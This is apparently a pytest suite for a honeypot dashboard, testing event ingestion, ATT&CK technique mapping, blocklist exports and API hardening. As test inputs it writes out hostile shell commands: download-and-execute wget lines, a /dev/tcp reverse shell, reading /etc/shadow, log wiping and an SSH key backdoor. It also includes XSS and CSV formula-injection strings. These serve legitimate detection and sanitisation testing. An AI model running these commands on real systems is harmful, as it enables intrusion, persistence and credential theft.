from __future__ import annotations

import asyncio
import json
import threading
import time
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from honeynet.analysis import analyze_file, get_backend
from honeynet.analysis.builtin import BuiltinBackend
from honeynet.analysis.fixtures import C2_IP, DROP_IP, all_fixtures
from honeynet.common.config import Settings
from honeynet.common.events import EventWriter, new_session_id
from honeynet.dashboard import attack, classify, exports, queries as q, report
from honeynet.dashboard.alerts import AlertManager
from honeynet.dashboard.app import Broker, Services, create_app
from honeynet.dashboard.auth import Authenticator, hash_password, verify_password
from honeynet.dashboard.db import DB
from honeynet.dashboard.enrich import ExternalLookups, GeoResolver, sim_geo
from honeynet.dashboard.ingest import Ingestor
from honeynet.dashboard.samples import AnalysisImporter
from honeynet.simulator.synthetic import SyntheticTraffic

PW = "correct horse battery staple"
H = {"X-Requested-With": "honeynet"}


@pytest.fixture
def dsettings(settings: Settings) -> Settings:
    settings.dashboard_password_hash = hash_password(PW, iterations=1000)
    settings.ignore_src = ["198.51.100.250"]
    settings.alert_cooldown_seconds = 600
    return settings


def mk(settings: Settings) -> tuple[DB, Ingestor]:
    db = DB(settings.db_path)
    ing = Ingestor(settings, db, GeoResolver(None, settings.test_mode))
    return db, ing


def writer(settings: Settings, svc: str = "ssh") -> EventWriter:
    return EventWriter(svc, settings.events_dir, max_per_ip_minute=10**9)


# ----------------------------------------------------------------------------- ingest

def test_ingest_builds_derived_tables(dsettings):
    db, ing = mk(dsettings)
    w = writer(dsettings)
    s = new_session_id()
    ip = "203.0.113.50"
    w.emit("conn.open", ip, src_port=4000, dst_port=22, session=s)
    w.emit("auth.attempt", ip, session=s, username="root", password="xc3511", method="password", success=True)
    w.emit("session.open", ip, session=s, username="root", password="xc3511", method="password", client_version="SSH-2.0-Go")
    w.emit("cmd.input", ip, session=s, input=f"cd /tmp; wget http://{DROP_IP}/x.sh; chmod +x x.sh; ./x.sh", status=0, output="", cwd="/tmp", user="root")
    w.emit("download.attempt", ip, session=s, url=f"http://{DROP_IP}/x.sh", via="wget", host=DROP_IP, scheme="http", fetched=False)
    sha = "ab" * 32
    w.emit("file.captured", ip, session=s, sha256=sha, md5="0" * 32, size=99, path="/tmp/x.sh", origin="download", url=f"http://{DROP_IP}/x.sh", via="exec")
    w.emit("exploit.attempt", ip, session=s, rule="demo-rule", cve="CVE-0000-0", category="rce", severity=5, snippet="x", path="/", method="GET")
    w.emit("session.close", ip, session=s, duration=12.5, commands=1, username="root", downloads=1, reason="closed")
    assert ing.poll_once() == 8
    assert ing.poll_once() == 0                                              # offset persisted
    row = db.one("SELECT * FROM sessions WHERE id=?", (s,))
    assert row["authed"] == 1 and row["closed"] == 1 and row["commands"] == 1 and row["files"] == 1 and row["exploits"] == 1
    assert row["username"] == "root" and row["duration"] == 12.5
    ipi = db.one("SELECT * FROM ip_info WHERE ip=?", (ip,))
    assert ipi["conns"] == 1 and ipi["auth"] == 1 and ipi["exploits"] == 1 and ipi["files"] == 1 and ipi["classification"] == "malicious"
    assert ipi["country"]                                                    # simulated geo in test mode
    smp = db.one("SELECT * FROM samples WHERE sha256=?", (sha,))
    assert smp["count"] == 1 and smp["status"] == "pending"
    techniques = {r["technique"] for r in db.query("SELECT technique FROM attack_hits")}
    assert {"T1105", "T1222.002", "T1078", "T1190"} <= techniques
    iocs = {(r["type"], r["value"]) for r in db.query("SELECT type, value FROM iocs")}
    assert ("ip", DROP_IP) in iocs and ("url", f"http://{DROP_IP}/x.sh") in iocs
    assert db.one("SELECT 1 AS x FROM ioc_samples WHERE sha256=?", (sha,))


def test_ingest_follows_rotation_and_dedupes(dsettings):
    db, ing = mk(dsettings)
    w = writer(dsettings)
    for i in range(5):
        w.emit("conn.open", f"203.0.113.{i + 1}", session=new_session_id())
    assert ing.poll_once() == 5
    w.emit("conn.open", "203.0.113.9", session=new_session_id())               # not yet read
    w._rotate()
    for i in range(3):
        w.emit("conn.open", f"203.0.113.{i + 20}", session=new_session_id())
    assert ing.poll_once() == 4                                                # rest of the rotated file + new file
    assert ing.poll_once() == 0
    assert db.scalar("SELECT COUNT(*) FROM events") == 9
    # a second ingestor starting from scratch re-reads everything but stores nothing twice
    db2_ing = Ingestor(dsettings, db, GeoResolver(None, True))
    db.execute("DELETE FROM ingest_state")
    assert db2_ing.poll_once() == 0 and db.scalar("SELECT COUNT(*) FROM events") == 9


def test_hostile_event_lines_are_rejected_or_neutralised(dsettings):
    db, ing = mk(dsettings)
    d = dsettings.events_dir / "evil"
    d.mkdir(parents=True)
    now = time.time()
    good = {"v": 1, "id": "good0001", "ts": now, "service": "ssh", "event": "auth.attempt", "src_ip": "203.0.113.77", "src_port": 1, "dst_port": 22,
            "session": "s1", "data": {"username": "\x1b[31mroot\x1b[0m\r\n{\"fake\":1}", "password": "<script>alert(1)</script>", "success": False}}
    lines = [
        json.dumps(good),
        "not json at all", "[1,2,3]", "{" * 5000, json.dumps({**good, "id": "bad00001", "service": "../../etc"}),
        json.dumps({**good, "id": "bad00002", "src_ip": "999.1.1.1"}), json.dumps({**good, "id": "bad00003", "ts": 12}),
        json.dumps({**good, "id": "bad00004", "event": "x" * 100}), json.dumps({**good, "id": "bad00005", "session": "../x"}),
        json.dumps({**good, "id": "big00006", "data": {"blob": "A" * 400_000}}),
        json.dumps({**good, "id": "ok000007", "src_port": 10**12, "data": {"n": {"a": {"b": {"c": {"d": {"e": 1}}}}}}}),
    ]
    (d / "events.jsonl").write_text("\n".join(lines) + "\n", "utf-8")
    ing.poll_once()
    ids = {r["id"] for r in db.query("SELECT id FROM events")}
    assert "good0001" in ids and "ok000007" in ids
    assert not any(i.startswith(("bad0000", "big")) for i in ids - {"bad00005"})
    # an invalid session id does not drop the event, it just loses the (attacker-controlled) session link
    assert db.one("SELECT session FROM events WHERE id='bad00005'")["session"] is None
    u = db.one("SELECT username, password FROM auth_attempts")
    assert "\x1b" not in u["username"] and "\\x1b" in u["username"] and "\r" not in u["username"]
    assert u["password"] == "<script>alert(1)</script>"                       # kept as text; rendered with textContent only
    assert ing.rejected >= 6


def test_admin_ip_and_secrets_never_reach_the_database(dsettings):
    dsettings.extra_secrets = ["s3cr3t-token-123"]
    db, ing = mk(dsettings)
    d = dsettings.events_dir / "ssh"
    d.mkdir(parents=True, exist_ok=True)
    now = time.time()
    rows = [{"v": 1, "id": "adm00001", "ts": now, "service": "ssh", "event": "conn.open", "src_ip": "198.51.100.250", "session": "a1", "data": {}},
            {"v": 1, "id": "sec00001", "ts": now, "service": "ssh", "event": "cmd.input", "src_ip": "203.0.113.5", "session": "a2",
             "data": {"input": "echo s3cr3t-token-123"}}]
    (d / "events.jsonl").write_text("\n".join(map(json.dumps, rows)) + "\n", "utf-8")
    ing.poll_once()
    assert db.scalar("SELECT COUNT(*) FROM events WHERE src_ip='198.51.100.250'") == 0
    assert "s3cr3t" not in json.dumps(db.query("SELECT * FROM commands"))


# ----------------------------------------------------------------------------- mapping / classification

@pytest.mark.parametrize("cmd,tech", [
    ("wget http://1.2.3.4/a.sh -O- | sh", "T1105"), ("crontab -l; echo '* * * * * x' | crontab -", "T1053.003"),
    ("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "T1098.004"), ("history -c", "T1070.003"), ("uname -a", "T1082"),
    ("cat /etc/shadow", "T1003.008"), ("echo aGk= | base64 -d", "T1140"), ("./xmrig --donate-level 1", "T1496"),
    ("iptables -F", "T1562.004"), ("whoami", "T1033"), ("ps aux", "T1057"), ("ifconfig", "T1016"), ("killall -9 foo", "T1489"),
    ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "T1095"), ("useradd bob", "T1136.001"), ("nmap -sS 10.0.0.0/24", "T1046"),
    ("rm -rf /var/log/auth.log", "T1070.002"), ("chmod 777 x", "T1222.002"), ("reboot", "T1529"),
])
def test_attack_mapping(cmd, tech):
    assert tech in {t for t, _ in attack.map_command(cmd)}, cmd


def test_attack_ids_are_all_known():
    for rule in attack.COMMAND_RULES:
        assert rule.technique in attack.TECHNIQUES, rule.technique
    for lst in attack.EXPLOIT_CATEGORY_MAP.values():
        assert all(t in attack.TECHNIQUES for t in lst)


def test_classification():
    assert classify.classify({"auth": 0, "exploits": 1}, classify.tags_for({"exploits": 1}), None) == "malicious"
    assert classify.classify({"auth": 9}, classify.tags_for({"auth": 9}), None) == "suspicious"
    assert classify.classify({"conns": 1, "events": 2}, classify.tags_for({"conns": 1, "events": 2}), None) == "scanner"
    assert classify.classify({"conns": 1, "events": 1}, ["scanner"], "Censys, Inc.") == "benign"
    assert classify.classify({"exploits": 3}, ["exploiter"], "Censys, Inc.") == "malicious"
    assert "research" in classify.ua_flags("Mozilla/5.0 zgrab/0.x")


def test_sim_geo_deterministic_and_geo_resolver_test_mode():
    assert sim_geo("203.0.113.5") == sim_geo("203.0.113.5")
    g = GeoResolver(None, True)
    assert g.lookup("203.0.113.5")["country"] and g.lookup("10.0.0.1") == {}
    assert GeoResolver(None, False).lookup("203.0.113.5") == {}


# ----------------------------------------------------------------------------- full pipeline with synthetic traffic

@pytest.fixture
def populated(dsettings):
    syn = SyntheticTraffic(dsettings, seed=3)
    n = syn.backfill(hours=8, per_hour=60)
    # analysis reports for whatever was captured
    be = get_backend("builtin") if BuiltinBackend.available() else None
    dsettings.analysis_dir.mkdir(parents=True, exist_ok=True)
    from honeynet.common.quarantine import Quarantine
    qd = Quarantine(dsettings.quarantine_dir)
    for sha in qd.iter_hashes():
        rep = analyze_file(qd.path_for(sha), be)
        (dsettings.analysis_dir / f"{sha}.json").write_text(json.dumps(rep), "utf-8")
    svc = Services(dsettings)
    got = svc.ingestor.poll_once()
    assert got > 100 and got >= n
    svc.importer.poll_once()
    return svc


def test_pipeline_summary_charts_and_tops(populated):
    db = populated.db
    since, until = q.window(hours=24)
    s = q.summary(db, since, until)
    assert s["connections"] > 50 and s["auth_attempts"] > 20 and s["unique_ips"] > 10 and s["exploits"] > 0 and s["countries"] > 3
    ts = q.timeseries(db, since, until)
    assert ts["points"] and sum(p["conns"] for p in ts["points"]) == s["connections"]
    for what in ("ips", "countries", "asns", "usernames", "passwords", "commands", "services", "ports", "exploits", "techniques", "credentials"):
        rows = q.top(db, what, since, until, 5)
        assert rows, what
    with pytest.raises(ValueError):
        q.top(db, "nope", since, until)
    m = q.map_points(db, since, until)
    assert m["points"] and all(-90 <= p["lat"] <= 90 and -180 <= p["lon"] <= 180 for p in m["points"])
    mat = q.attack_matrix(db, since, until)
    assert mat["total"] > 0 and any(t["n"] for tac in mat["tactics"] for t in tac["techniques"])


def test_session_replay_and_ip_profile(populated):
    db = populated.db
    sessions = q.sessions_list(db, 50, with_commands=True)
    assert sessions
    d = q.session_detail(db, sessions[0]["id"])
    kinds = [f["event"] for f in d["frames"]]
    assert "cmd.input" in kinds and d["frames"][0]["t"] >= 0
    assert any(f.get("attack") for f in d["frames"] if f["event"] == "cmd.input")
    assert all(a["id"].startswith("T") for a in d["attack"])
    prof = q.ip_profile(db, d["src_ip"])
    assert prof["info"]["events"] > 0 and prof["credentials"] is not None
    assert q.session_detail(db, "nonexistent") is None


def test_samples_iocs_and_blocklist_feedback(populated):
    db = populated.db
    smp = q.samples_list(db)
    assert smp and all(s["status"] == "analyzed" for s in smp) if BuiltinBackend.available() else smp
    detail = q.sample_detail(db, smp[0]["sha256"])
    assert detail["sources"] and detail["risk_level"] is not None
    # C2 learned from the analysed bot flows into the C2 export (new IOCs fed back)
    ind = exports.c2_indicators(db, populated.s)
    assert any(i["value"] == C2_IP for i in ind["ips"]) or any(i["value"] == DROP_IP for i in ind["ips"])
    assert C2_IP in exports.render_c2(ind, "ips") or DROP_IP in exports.render_c2(ind, "ips")
    rows = exports.ioc_rows(db, populated.s)
    assert rows and {r["type"] for r in rows} & {"url", "ip", "endpoint"}


def test_blocklist_exports_are_safe(populated):
    s, db = populated.s, populated.db
    # add a private IP, the admin IP (should be dropped by the ingestor already) and a research scanner
    db.execute("INSERT INTO ip_info(ip, first_seen, last_seen, classification, events, exploits) VALUES('10.9.9.9', ?, ?, 'malicious', 5, 3)", (time.time(),) * 2)
    db.execute("INSERT INTO ip_info(ip, first_seen, last_seen, classification, events, exploits) VALUES('198.51.100.250', ?, ?, 'malicious', 5, 3)", (time.time(),) * 2)
    db.execute("INSERT INTO ip_info(ip, first_seen, last_seen, classification, events) VALUES('203.0.113.251', ?, ?, 'benign', 5)", (time.time(),) * 2)
    entries = exports.blocklist_entries(db, s, days=7, level="suspicious")
    ips = {e["ip"] for e in entries}
    assert ips and "10.9.9.9" not in ips and "198.51.100.250" not in ips and "203.0.113.251" not in ips
    for fmt in exports.FORMATS:
        text = exports.render_blocklist(entries, fmt)
        assert "10.9.9.9" not in text and "198.51.100.250" not in text, fmt
        assert any(ip in text for ip in ips), fmt
    ipset = exports.render_blocklist(entries, "ipset")
    assert ipset.startswith("create honeynet-block hash:ip") and "add honeynet-block " in ipset
    assert "table inet honeynet" in exports.render_blocklist(entries, "nft")
    assert "iptables -A HONEYNET_BLOCK -s " in exports.render_blocklist(entries, "iptables")
    assert exports.render_blocklist(entries, "txt").startswith("# honeynet blocklist")
    # outside test mode the documentation ranges are never exported
    s.test_mode = False
    assert exports.blocklist_entries(db, s, days=7, level="all") == []
    s.test_mode = True


def test_csv_exports_neutralise_formula_injection(dsettings):
    db, ing = mk(dsettings)
    db.execute("INSERT INTO iocs(type,value,scope,confidence,kind,context,first_seen,last_seen) VALUES('command','=HYPERLINK(\"http://x\",\"y\")','',0.9,'analysis','@SUM(1)',?,?)",
               (time.time(),) * 2)
    rows = exports.ioc_rows(db, dsettings)
    out = exports.render_iocs(rows, "csv")
    assert "'=HYPERLINK" in out and ",'@SUM" in out
    assert json.loads(exports.render_iocs(rows, "json"))["count"] == 1


# ----------------------------------------------------------------------------- API + security

@pytest.fixture
def client(populated):
    app = create_app(populated.s, start_background=False)
    populated.db.close()                           # the app opens its own Services on the same DB file
    c = TestClient(app, base_url="http://testserver")
    # app made a fresh Services instance on the same DB file, so ingest is already visible
    return c


def login(c: TestClient) -> None:
    r = c.post("/api/login", json={"password": PW}, headers=H)
    assert r.status_code == 200, r.text


def test_api_requires_login_and_has_security_headers(client):
    assert client.get("/api/summary").status_code == 401
    assert client.get("/api/me").json()["authed"] is False
    assert client.get("/healthz").json() == {"ok": True}
    r = client.get("/api/me")
    assert "default-src 'none'" in r.headers["content-security-policy"] and "script-src 'self'" in r.headers["content-security-policy"]
    assert "unsafe-inline" not in r.headers["content-security-policy"]
    assert r.headers["x-content-type-options"] == "nosniff" and r.headers["x-frame-options"] == "DENY"
    assert r.headers["cache-control"] == "no-store"


def test_login_logout_and_cookie_flags(client):
    bad = client.post("/api/login", json={"password": "nope"}, headers=H)
    assert bad.status_code == 401
    r = client.post("/api/login", json={"password": PW}, headers=H)
    sc = r.headers["set-cookie"].lower()
    assert "httponly" in sc and "samesite=strict" in sc
    assert client.get("/api/summary").status_code == 200
    assert client.post("/api/logout", headers=H).status_code == 200
    assert client.get("/api/summary").status_code == 401


def test_login_throttling(client):
    codes = [client.post("/api/login", json={"password": f"x{i}"}, headers=H).status_code for i in range(8)]
    assert 429 in codes
    r = client.post("/api/login", json={"password": PW}, headers=H)
    assert r.status_code == 429 and "retry-after" in r.headers          # even the right password is locked out for a while


def test_csrf_and_host_checks(client):
    login(client)
    assert client.post("/api/alerts/ack", json={}).status_code == 403                      # no X-Requested-With
    assert client.post("/api/alerts/ack", json={}, headers={**H, "Origin": "http://evil.example"}).status_code == 403
    assert client.post("/api/alerts/ack", json={}, headers={**H, "Origin": "http://testserver"}).status_code == 200
    assert client.get("/api/summary", headers={"Host": "evil.example"}).status_code == 400   # DNS rebinding guard


def test_api_endpoints_return_data(client):
    login(client)
    assert client.get("/api/summary?hours=24").json()["connections"] > 0
    assert client.get("/api/timeseries?hours=24").json()["points"]
    assert client.get("/api/top?what=usernames&limit=5").json()
    assert client.get("/api/top?what=bogus").status_code == 400
    assert client.get("/api/map").json()["points"]
    evs = client.get("/api/events?limit=20").json()
    assert evs and {"id", "ts", "service", "event", "src_ip", "summary"} <= set(evs[0])
    assert client.get("/api/events?ip=not-an-ip!").status_code == 400
    sess = client.get("/api/sessions?with_commands=true&limit=5").json()
    assert sess and client.get(f"/api/sessions/{sess[0]['id']}").json()["frames"]
    assert client.get("/api/sessions/..%2F..%2Fetc").status_code in (400, 404)
    assert client.get(f"/api/ips/{sess[0]['src_ip']}").json()["info"]["ip"] == sess[0]["src_ip"]
    smp = client.get("/api/samples").json()
    assert smp
    one = client.get(f"/api/samples/{smp[0]['sha256']}").json()
    assert one["sources"] and ("report" in one)
    assert client.get("/api/samples/zz").status_code == 400
    assert client.get(f"/api/samples/{'0' * 64}").status_code == 404
    assert client.get("/api/iocs?limit=5").json() is not None
    assert client.get("/api/attack").json()["tactics"]
    assert client.get("/api/health").json()["events_total"] > 0
    cfg = client.get("/api/config").json()
    assert cfg["test_mode"] is True and "abuseipdb_key" not in json.dumps(cfg)


def test_exports_via_api(client):
    login(client)
    r = client.get("/api/export/blocklist?fmt=ipset&level=all&days=7")
    assert r.status_code == 200 and "attachment" in r.headers["content-disposition"] and r.text.startswith("create honeynet-block")
    assert client.get("/api/export/blocklist?fmt=nope").status_code == 400
    assert client.get("/api/export/iocs?fmt=csv").text.startswith("type,value")
    assert client.get("/api/export/c2?what=ips").status_code == 200
    md = client.get("/api/export/report?fmt=md&hours=24").text
    assert md.startswith("# Honeynet daily report") and "Top source IPs" in md
    html = client.get("/api/export/report?fmt=html&hours=24").text
    assert "<script" not in html.lower()
    assert "198.51.100.250" not in md + html


def test_malware_is_never_served(client):
    login(client)
    smp = client.get("/api/samples").json()[0]
    for path in (f"/api/samples/{smp['sha256']}/download", f"/api/samples/{smp['sha256']}/raw", f"/quarantine/{smp['sha256']}"):
        assert client.get(path).status_code in (404, 405)


def test_refuses_to_start_without_password_outside_test_mode(dsettings):
    dsettings.test_mode = False
    dsettings.dashboard_password_hash = ""
    dsettings.dashboard_password = ""
    with pytest.raises(SystemExit):
        create_app(dsettings, start_background=False)


def test_password_hashing():
    h = hash_password("pw", iterations=1000)
    assert verify_password("pw", h) and not verify_password("pw2", h) and not verify_password("pw", "garbage")
    assert not verify_password("pw", "pbkdf2_sha256$1$aa$bb")


def test_auth_cookie_tamper_and_expiry(dsettings):
    a = Authenticator(dsettings)
    c = a.make_cookie()
    assert a.verify_cookie(c)
    exp, nonce, sig = c.split(".")
    assert not a.verify_cookie(f"{int(exp) + 99999}.{nonce}.{sig}")
    assert not a.verify_cookie(f"{exp}.{nonce}.{sig[:-2]}xx")
    assert not a.verify_cookie(f"{int(time.time()) - 5}.{nonce}.{sig}")
    a.revoke(c)
    assert not a.verify_cookie(c)


# ----------------------------------------------------------------------------- alerts

def test_alerts_new_sample_cooldown_and_injection_safety(dsettings):
    db = DB(dsettings.db_path)
    sent = []
    dsettings.webhook_url = "https://hooks.example.invalid/x"
    am = AlertManager(dsettings, db, webhook=lambda url, p: sent.append(p), mailer=lambda *a: None, synchronous=True)
    evil = {"sha256": "ab" * 32, "size": 10, "src_ip": "203.0.113.5", "service": "ssh", "origin": "@everyone <@123>",
            "url": "http://evil.example.invalid/[click](http://phish.example)"}
    am.new_sample(evil)
    am.new_sample(evil)                                                   # cooldown: same key within window
    assert len(sent) == 1
    text = json.dumps(sent[0])
    assert "@everyone" not in text and "<@123>" not in text and "http://evil" not in text and "](http" not in text
    assert db.scalar("SELECT COUNT(*) FROM alerts") == 1 and db.scalar("SELECT delivered FROM alerts") == 1
    am.new_exploit({"rule": "r1", "cve": "CVE-1", "category": "rce", "service": "http", "src_ip": "203.0.113.5", "snippet": "x"})
    am.analyzed({"sha256": "ab" * 32, "family": "Mirai-style IoT bot", "confidence": 0.9, "risk": "high", "score": 70, "c2": ["203.0.113.45:23"], "mitre": ["T1110.001"]})
    assert {a["kind"] for a in am.list()} == {"new_sample", "new_exploit", "sample_analyzed"}


def test_alert_delivery_failure_is_recorded_not_raised(dsettings):
    db = DB(dsettings.db_path)
    dsettings.webhook_url = "https://hooks.example.invalid/x"

    def boom(url, payload):
        raise OSError("down")

    am = AlertManager(dsettings, db, webhook=boom, synchronous=True)
    am.raise_alert("test", "k", "t", "d")
    assert db.scalar("SELECT delivered FROM alerts") == -1


def test_spike_detection(dsettings):
    db, ing = mk(dsettings)
    am = AlertManager(dsettings, db, synchronous=True)
    w = writer(dsettings)
    now = time.time()
    for i in range(10):                                           # quiet baseline
        w.emit_at(now - 3600 + i * 60, "conn.open", f"203.0.113.{i + 1}", session=new_session_id())
    assert ing.poll_once() == 10
    assert am.check_spike(now) is False
    for i in range(120):
        w.emit_at(now - 30 + i * 0.1, "auth.attempt", "203.0.113.200", session="spk", username="root", password=str(i), method="password", success=False)
    ing.poll_once()
    assert am.check_spike(now) is True
    assert db.one("SELECT * FROM alerts WHERE kind='spike'")


def test_new_sample_and_new_rule_trigger_alerts_via_ingestor(dsettings):
    svc = Services(dsettings)
    w = writer(dsettings, "http")
    w.emit("file.captured", "203.0.113.5", session="h1", sha256="cd" * 32, md5="0" * 32, size=5, origin="http-upload", path="/x", via="http-post", url="")
    w.emit("exploit.attempt", "203.0.113.5", session="h1", rule="brand-new-rule", cve="CVE-9", category="rce", severity=5, snippet="s", path="/", method="GET")
    w.emit("exploit.attempt", "203.0.113.6", session="h2", rule="brand-new-rule", cve="CVE-9", category="rce", severity=5, snippet="s", path="/", method="GET")
    svc.ingestor.poll_once()
    kinds = [a["kind"] for a in svc.alerts.list()]
    assert kinds.count("new_sample") == 1 and kinds.count("new_exploit") == 1


# ----------------------------------------------------------------------------- external lookups

def test_malwarebazaar_lookup_sends_only_the_hash(dsettings):
    dsettings.bazaar_enabled, dsettings.bazaar_key = True, "key-123"
    db = DB(dsettings.db_path)
    sha = "ef" * 32
    db.execute("INSERT INTO samples(sha256, first_seen, last_seen, count) VALUES(?,?,?,1)", (sha, 1.0, 1.0))
    seen = {}

    def fake_http(req, timeout):
        seen["url"], seen["body"], seen["hdr"] = req.full_url, req.data, dict(req.header_items())
        return {"query_status": "ok", "data": [{"signature": "Mirai", "file_type": "elf", "tags": ["mirai", "elf"], "first_seen": "2024-01-01",
                                                "delivery_method": "web_download", "vendor_intel": {"a": 1}}]}

    ext = ExternalLookups(dsettings, db, http=fake_http)
    out = ext.bazaar_lookup(sha)
    assert seen["url"] == "https://mb-api.abuse.ch/api/v1/" and seen["body"] == f"query=get_info&hash={sha}".encode()
    assert seen["hdr"]["Auth-key"] == "key-123"
    assert out["found"] and out["signature"] == "Mirai"
    assert json.loads(db.one("SELECT bazaar FROM samples WHERE sha256=?", (sha,))["bazaar"])["found"] is True


def test_external_lookups_are_off_by_default_and_budgeted(dsettings):
    db = DB(dsettings.db_path)
    ext = ExternalLookups(dsettings, db, http=lambda *a: pytest.fail("must not call out"))
    ext.want_abuse("8.8.4.4")
    ext.want_bazaar("00" * 32)
    assert ext.q.empty() and not ext.abuse_on and not ext.bazaar_on
    dsettings.abuseipdb_enabled, dsettings.abuseipdb_key, dsettings.abuseipdb_daily_limit = True, "k", 2
    calls = []
    ext2 = ExternalLookups(dsettings, db, http=lambda req, t: calls.append(req.full_url) or {"data": {"abuseConfidenceScore": 77}})
    for ip in ("8.8.4.4", "8.8.8.8", "1.1.1.1"):
        db.execute("INSERT OR IGNORE INTO ip_info(ip, first_seen, last_seen) VALUES(?,?,?)", (ip, 1.0, 1.0))
        ext2.abuse_check(ip)
    assert len(calls) == 2                                           # daily budget enforced
    assert db.scalar("SELECT abuse_score FROM ip_info WHERE ip='8.8.4.4'") == 77
    ext2.want_abuse("10.0.0.1")
    assert ext2.q.empty()                                            # private addresses are never sent


# ----------------------------------------------------------------------------- reports, broker, retention

def test_daily_report_files(populated):
    s = populated.s
    paths = report.write_daily(populated.db, s, day_start=time.time() // 86400 * 86400)
    assert all(p.exists() for p in paths.values())
    md = paths["md"].read_text("utf-8")
    assert "# Honeynet daily report" in md and "## Overview" in md
    assert json.loads(paths["json"].read_text("utf-8"))["summary"]["events"] >= 0
    assert "<script" not in paths["html"].read_text("utf-8").lower()
    # defanged indicators in the human-readable report
    assert "http://" + DROP_IP not in md


def test_broker_fan_out_from_other_thread():
    async def run():
        b = Broker()
        qu = b.subscribe()
        threading.Thread(target=lambda: b.publish([{"n": 1}, {"n": 2}])).start()
        got = [await asyncio.wait_for(qu.get(), 2), await asyncio.wait_for(qu.get(), 2)]
        b.unsubscribe(qu)
        return got

    assert asyncio.run(run()) == [{"n": 1}, {"n": 2}]


def test_retention_prune_keeps_samples_and_iocs(populated):
    db = populated.db
    before_samples = db.scalar("SELECT COUNT(*) FROM samples")
    n = db.prune(time.time() + 10)
    assert n > 0 and db.scalar("SELECT COUNT(*) FROM events") == 0
    assert db.scalar("SELECT COUNT(*) FROM samples") == before_samples and db.scalar("SELECT COUNT(*) FROM iocs") > 0
